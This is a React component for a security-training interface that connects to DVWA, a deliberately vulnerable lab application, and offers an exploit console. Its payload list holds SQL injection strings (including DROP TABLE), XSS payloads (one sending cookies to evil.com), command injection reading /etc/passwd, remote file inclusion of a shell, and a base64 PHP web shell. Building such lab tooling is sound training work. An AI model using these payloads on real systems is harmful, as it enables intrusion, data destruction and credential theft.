
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Switch } from '@/components/ui/switch';
import { Label } from '@/components/ui/label';
import { 
  Select, 
  SelectContent, 
  SelectGroup, 
  SelectItem, 
  SelectLabel, 
  SelectTrigger, 
  SelectValue 
} from '@/components/ui/select';
import { PlugIcon, CheckIcon, PlayCircleIcon, PulseIcon, ShieldAlert } from 'lucide-react';
import { toast } from 'sonner';

export interface DVWAConnectionDetails {
  url: string;
  username: string;
  password: string;
  securityLevel: string;
  vulnerabilityPath?: string;
  exploitPayload?: string;
}

interface DVWAConnectionProps {
  isConnected: boolean;
  onConnect: (details: DVWAConnectionDetails) => void;
  onDisconnect: () => void;
  connectionDetails?: DVWAConnectionDetails;
  selectedVulnerability?: string;
  onVulnerabilitySelect?: (vulnerability: string, path: string) => void;
  onExploitSubmit?: (payload: string) => void;
}

// Define available vulnerabilities in DVWA
const DVWA_VULNERABILITIES = [
  { 
    name: 'SQL Injection', 
    path: '/vulnerabilities/sqli/',
    payloads: [
      "' OR '1'='1",
      "' UNION SELECT user,password FROM users #",
      "' OR 1=1 #",
      "admin' --",
      "'; DROP TABLE users; --"
    ]
  },
  { 
    name: 'XSS (Reflected)', 
    path: '/vulnerabilities/xss_r/',
    payloads: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<iframe src='javascript:alert(`XSS`)'>"
    ]
  },
  { 
    name: 'XSS (Stored)', 
    path: '/vulnerabilities/xss_s/',
    payloads: [
      "<script>alert(document.cookie)</script>",
      "<img src=x onerror=fetch('https://evil.com?cookie='+document.cookie)>",
      "<svg/onload=alert('Stored XSS')>"
    ]
  },
  { 
    name: 'Command Injection', 
    path: '/vulnerabilities/exec/',
    payloads: [
      "127.0.0.1 && cat /etc/passwd",
      "127.0.0.1 ; cat /etc/passwd",
      "127.0.0.1 | cat /etc/passwd",
      "127.0.0.1 || cat /etc/passwd"
    ]
  },
  { 
    name: 'File Inclusion', 
    path: '/vulnerabilities/fi/',
    payloads: [
      "../../../../../etc/passwd",
      "http://evil.com/shell.php",
      "php://filter/convert.base64-encode/resource=index.php",
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
    ]
  },
  { 
    name: 'File Upload', 
    path: '/vulnerabilities/upload/',
    payloads: [
      "shell.php disguised as shell.php.jpg",
      "shell.php with GIF89a; header",
      "shell.php with altered MIME type",
      ".htaccess file to make .jpg execute as PHP"
    ]
  },
  { 
    name: 'CSRF', 
    path: '/vulnerabilities/csrf/',
    payloads: [
      "<img src='http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change' height='0' width='0' border='0'>",
      "Form submission from external site",
      "XHR request with forged session",
      "Clickjacking with iframe overlay"
    ]
  }
];

export const DVWAConnection: React.FC<DVWAConnectionProps> = ({
  isConnected,
  onConnect,
  onDisconnect,
  connectionDetails,
  selectedVulnerability,
  onVulnerabilitySelect,
  onExploitSubmit
}) => {
  const [url, setUrl] = useState('http://localhost/dvwa');
  const [username, setUsername] = useState('admin');
  const [password, setPassword] = useState('password');
  const [securityLevel, setSecurityLevel] = useState('low');
  const [autoLogin, setAutoLogin] = useState(false);
  const [connectingState, setConnectingState] = useState(false);
  const [vulnerabilityType, setVulnerabilityType] = useState('');
  const [selectedExploit, setSelectedExploit] = useState('');
  const [customPayload, setCustomPayload] = useState('');
  const [showExploitConsole, setShowExploitConsole] = useState(false);
  
  // Update form if props change
  useEffect(() => {
    if (connectionDetails) {
      setUrl(connectionDetails.url);
      setUsername(connectionDetails.username);
      setPassword(connectionDetails.password);
      setSecurityLevel(connectionDetails.securityLevel);
    }
  }, [connectionDetails]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!url || !username || !password) {
      toast.error('Please fill all required fields');
      return;
    }
    
    setConnectingState(true);
    
    // Simulate connection to DVWA
    setTimeout(() => {
      const details: DVWAConnectionDetails = {
        url,
        username,
        password,
        securityLevel,
        vulnerabilityPath: '',
        exploitPayload: ''
      };
      
      onConnect(details);
      setConnectingState(false);
      toast.success(`Connected to DVWA at ${url}`);
    }, 1500);
  };
  
  const handleVulnerabilitySelect = (value: string) => {
    setVulnerabilityType(value);
    const selectedVuln = DVWA_VULNERABILITIES.find(v => v.name === value);
    
    if (selectedVuln && onVulnerabilitySelect) {
      onVulnerabilitySelect(value, selectedVuln.path);
      setShowExploitConsole(true);
      // Reset exploit selection when vulnerability changes
      setSelectedExploit('');
      setCustomPayload('');
    }
  };
  
  const handleExploitSelect = (value: string) => {
    setSelectedExploit(value);
    setCustomPayload(value);
  };
  
  const handleExploitSubmit = () => {
    if (!customPayload) {
      toast.error('Please select or enter an exploit payload');
      return;
    }
    
    if (onExploitSubmit) {
      onExploitSubmit(customPayload);
      toast.success('Exploit payload submitted for testing');
    }
  };

  if (isConnected) {
    return (
      <Card className="bg-white/5 border-green-900/30 shadow-lg shadow-green-500/5">
        <CardHeader className="pb-3">
          <div className="flex justify-between items-center">
            <div>
              <CardTitle className="text-xl font-bold flex items-center">
                <PlugIcon className="mr-2 h-5 w-5 text-green-500" />
                DVWA Connected
              </CardTitle>
              <CardDescription>Target: {connectionDetails?.url}</CardDescription>
            </div>
            <Button 
              variant="outline" 
              size="sm" 
              onClick={onDisconnect}
              className="border-red-700/30 hover:border-red-500/50 text-red-500"
            >
              Disconnect
            </Button>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-black/30 border border-green-900/30 rounded-md p-3">
              <div className="text-xs text-green-400 mb-1">Connection Details</div>
              <div className="text-sm">
                <div className="flex justify-between">
                  <span className="text-white/70">Username:</span>
                  <span className="font-mono">{connectionDetails?.username}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-white/70">Security Level:</span>
                  <span className="font-mono">{connectionDetails?.securityLevel}</span>
                </div>
              </div>
            </div>
            
            <div className="bg-black/30 border border-green-900/30 rounded-md p-3">
              <div className="text-xs text-green-400 mb-1">Select Vulnerability</div>
              <Select value={vulnerabilityType} onValueChange={handleVulnerabilitySelect}>
                <SelectTrigger className="w-full bg-black/30 border-green-900/30">
                  <SelectValue placeholder="Select vulnerability" />
                </SelectTrigger>
                <SelectContent>
                  <SelectGroup>
                    <SelectLabel>Vulnerabilities</SelectLabel>
                    {DVWA_VULNERABILITIES.map((vuln) => (
                      <SelectItem key={vuln.name} value={vuln.name}>
                        {vuln.name}
                      </SelectItem>
                    ))}
                  </SelectGroup>
                </SelectContent>
              </Select>
            </div>
          </div>
          
          {/* Exploit Console */}
          {showExploitConsole && vulnerabilityType && (
            <div className="bg-black/30 border border-yellow-900/30 rounded-md p-3 space-y-3">
              <div className="flex items-center justify-between">
                <div className="text-sm text-yellow-400 flex items-center">
                  <ShieldAlert className="mr-2 h-4 w-4" />
                  Exploit Console: {vulnerabilityType}
                </div>
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="h-7 px-2 py-1 text-yellow-400 hover:text-yellow-300 hover:bg-yellow-950/50"
                  onClick={() => window.open(`${url}${DVWA_VULNERABILITIES.find(v => v.name === vulnerabilityType)?.path}`, '_blank')}
                >
                  <PlayCircleIcon className="mr-1 h-3.5 w-3.5" />
                  Open in Browser
                </Button>
              </div>
              
              <div className="space-y-2">
                <div className="text-xs text-white/70">Select Exploit Payload:</div>
                <Select value={selectedExploit} onValueChange={handleExploitSelect}>
                  <SelectTrigger className="w-full bg-black/30 border-yellow-900/30">
                    <SelectValue placeholder="Select payload" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectGroup>
                      <SelectLabel>Payloads</SelectLabel>
                      {DVWA_VULNERABILITIES.find(v => v.name === vulnerabilityType)?.payloads.map((payload, index) => (
                        <SelectItem key={index} value={payload}>
                          {payload.length > 30 ? payload.substring(0, 30) + '...' : payload}
                        </SelectItem>
                      ))}
                    </SelectGroup>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <div className="text-xs text-white/70">Custom Payload:</div>
                <div className="flex gap-2">
                  <Input
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    placeholder="Enter payload or modify selected one"
                    className="font-mono text-sm bg-black/50 border-yellow-900/30"
                  />
                  <Button
                    onClick={handleExploitSubmit}
                    className="bg-yellow-600 hover:bg-yellow-700 text-white"
                  >
                    <PulseIcon className="mr-2 h-4 w-4" />
                    Execute
                  </Button>
                </div>
              </div>
            </div>
          )}
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="bg-white/5 border-purple-900/30 shadow-lg shadow-purple-500/5">
      <CardHeader className="pb-3">
        <CardTitle className="text-xl font-bold">
          DVWA Connection
        </CardTitle>
        <CardDescription>
          Connect to DVWA (Damn Vulnerable Web Application) for testing
        </CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="url">DVWA URL</Label>
            <Input 
              id="url"
              placeholder="http://localhost/dvwa"
              value={url}
              onChange={(e) => setUrl(e.target.value)}
              className="bg-white/5 border-white/10"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="username">Username</Label>
              <Input 
                id="username"
                placeholder="admin"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="bg-white/5 border-white/10"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input 
                id="password"
                type="password"
                placeholder="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-white/5 border-white/10"
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="security-level">Security Level</Label>
            <Select value={securityLevel} onValueChange={setSecurityLevel}>
              <SelectTrigger className="w-full bg-white/5 border-white/10">
                <SelectValue placeholder="Select security level" />
              </SelectTrigger>
              <SelectContent>
                <SelectGroup>
                  <SelectLabel>Security Levels</SelectLabel>
                  <SelectItem value="low">Low (Vulnerable)</SelectItem>
                  <SelectItem value="medium">Medium</SelectItem>
                  <SelectItem value="high">High</SelectItem>
                  <SelectItem value="impossible">Impossible</SelectItem>
                </SelectGroup>
              </SelectContent>
            </Select>
          </div>

          <div className="flex items-center space-x-2 pt-2">
            <Switch
              id="auto-login"
              checked={autoLogin}
              onCheckedChange={setAutoLogin}
            />
            <Label htmlFor="auto-login">Auto-login to DVWA</Label>
          </div>
        </form>
      </CardContent>
      <CardFooter className="border-t border-white/10 pt-4">
        <Button 
          type="submit" 
          onClick={handleSubmit}
          disabled={connectingState}
          className="w-full bg-purple-600 hover:bg-purple-700"
        >
          {connectingState ? (
            <>
              <PulseIcon className="mr-2 h-4 w-4 animate-pulse" />
              Connecting...
            </>
          ) : (
            <>
              <PlugIcon className="mr-2 h-4 w-4" />
              Connect to DVWA
            </>
          )}
        </Button>
      </CardFooter>
    </Card>
  );
};
